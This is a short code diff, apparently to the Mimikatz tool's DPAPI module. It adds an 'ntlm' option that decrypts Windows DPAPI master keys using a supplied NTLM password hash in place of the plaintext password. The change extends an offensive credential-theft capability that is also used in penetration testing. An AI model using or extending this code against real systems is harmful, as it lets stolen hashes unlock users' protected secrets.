@@ -144,6 +144,8 @@ NTSTATUS kuhl_m_dpapi_protect(int argc, wchar_t * argv[]) // no support for prot
 
 NTSTATUS kuhl_m_dpapi_masterkey(int argc, wchar_t * argv[])
 {
+	PCWCHAR szNTLM = NULL;
+	BYTE pNTLM[LM_NTLM_HASH_LENGTH];
 	PKULL_M_DPAPI_MASTERKEYS masterkeys;
 	PBYTE buffer, pHash = NULL, pSystem = NULL;
 	PVOID output, derivedKey;
@@ -190,6 +192,15 @@ NTSTATUS kuhl_m_dpapi_masterkey(int argc, wchar_t * argv[])
 
 				if(kull_m_string_args_byName(argc, argv, L"hash", &szHash, NULL))
 					kull_m_string_stringToHexBuffer(szHash, &pHash, &cbHash);
+				
+				if (kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
+				{
+					kull_m_string_stringToHex(szNTLM, pNTLM, LM_NTLM_HASH_LENGTH);
+					kull_m_dpapi_getProtected(pNTLM, sizeof(pNTLM), convertedSid);
+					pHash = pNTLM;
+					cbHash = LM_NTLM_HASH_LENGTH;
+				}
+				
 				if(kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL))
 					kull_m_string_stringToHexBuffer(szSystem, &pSystem, &cbSystem);
 
